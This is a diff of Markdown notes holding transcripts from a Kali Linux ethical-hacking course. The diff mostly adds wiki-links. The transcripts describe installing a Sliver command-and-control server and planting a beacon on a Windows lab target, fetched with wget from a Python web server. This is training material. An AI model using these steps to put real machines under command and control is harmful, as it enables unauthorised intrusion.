-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980)
+#### [Install Sliver server](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3565,7 +3523,7 @@ created: 2026-05-02
 >
 > **[0:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=39)** Here, we can see the Sliver releases page.
 >
-> **[0:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=42)** I've downloaded the file called SliverServer/Linux and I've renamed it to just Sliver.
+> **[0:42](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=42)** I've downloaded the file called SliverServer/[[Linux]] and I've renamed it to just Sliver.
 >
 > **[0:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/install-silver-server?u=76281980&t=49)** So let's connect to the operator's console.
 >
@@ -3589,7 +3547,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (1), traffic (1)
+> **Frameworks & Libraries:** [[Linux]] (1)
 > **Ports:** port 8888 (2)
 > **Versions:** 192.168.142 (2)
 > **Code Identifiers:** mtls (1)
@@ -3597,16 +3555,15 @@ created: 2026-05-02
 > **Prerequisites:** set up (1)
 > **Speakers:** - [instructor] (1)
 
-#### Implement a Sliver agent
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980)
+#### [Implement a Sliver agent](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=0)** - [Instructor] I've set up a simple Python website on our Sliver server so that we can download the beacon into our Windows target.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=0)** - [Instructor] I've set up a simple [[Python (Programming Language)|Python]] website on our Sliver server so that we can download the beacon into our [[Windows]] target.
 >
 > **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=7)** And note, we're running the server on port 8,000.
 >
-> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=11)** I'm in a Windows server which is on my virtual box network, so it appears as an internal subnet.
+> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=11)** I'm in a [[Windows Server]] which is on my virtual box network, so it appears as an internal subnet.
 >
 > **[0:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/implement-a-silver-agent?u=76281980&t=17)** However, if an adversary can access it, they can still put it under command and control.
 >
@@ -3664,7 +3621,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), prompt (3), [[Python (Programming Language)|Python]] (1), [[Windows Server]] (1)
+> **Frameworks & Libraries:** [[Windows]] (3), [[Python (Programming Language)|Python]] (1), [[Windows Server]] (1)
 > **CLI Commands:** python (1), wget (1), find (1)
 > **Ports:** port 8 (1), :8000 (1)
 > **UI Navigation:** switch to (2)
@@ -3678,8 +3635,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Next steps
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980)
+#### [Next steps](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3687,25 +3643,25 @@ created: 2026-05-02
 >
 > **[0:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=7)** Taking this course is just one step towards becoming a professional pen tester, and I would encourage you to continue learning.
 >
-> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=15)** You can take additional ethical hacking and pen testing courses to get more understanding of exploits, and further develop and practice your skills around system and web testing, deep enumeration, and more.
+> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=15)** You can take additional [[Ethical Hacking]] and pen testing courses to get more understanding of exploits, and further develop and practice your skills around system and web testing, deep enumeration, and more.
 >
-> **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=29)** There's always something new in cybersecurity, and if you're interested in learning more, then check out the full security segment of the library, where new courses are added regularly.
+> **[0:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=29)** There's always something new in [[Cybersecurity]], and if you're interested in learning more, then check out the full security segment of the library, where new courses are added regularly.
 >
 > **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=40)** You'll find courses on all aspects of security.
 >
 > **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=44)** I'd also like to invite you to go to my author page, where you can find some additional pen testing courses, as well as a wider coverage of cybersecurity.
 >
-> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=54)** If you want to get hands-on with Android, then do take a look at mobile devices and platforms, and securing Android apps.
+> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=54)** If you want to get hands-on with [[Android]], then do take a look at mobile devices and platforms, and securing Android apps.
 >
-> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=61)** If you're wanting to learn about security for the cloud, then cybersecurity for cloud computing is for you.
+> **[1:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=61)** If you're wanting to learn about security for the cloud, then cybersecurity for [[Cloud Computing]] is for you.
 >
-> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=68)** You'll also find courses on the security aspects of wireless websites and the internet of things.
+> **[1:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=68)** You'll also find courses on the security aspects of wireless websites and the [[IoT|internet of things]].
 >
 > **[1:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/next-steps?u=76281980&t=75)** Thanks again for joining me on this course, and I hope to see you again soon for more courses on pen testing and cybersecurity.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Cybersecurity]] (4), [[Security]] (4), [[Android]] (2), cloud (2), [[Ethical Hacking]] (1)
+> **Frameworks & Libraries:** [[Cybersecurity]] (4), [[Android]] (2), [[Ethical Hacking]] (1), [[Cloud Computing]] (1), [[IoT|Internet of things]] (1)
 > **CLI Commands:** find (3)
 > **UI Navigation:** go to (1)
 > **Speakers:** - i (1)
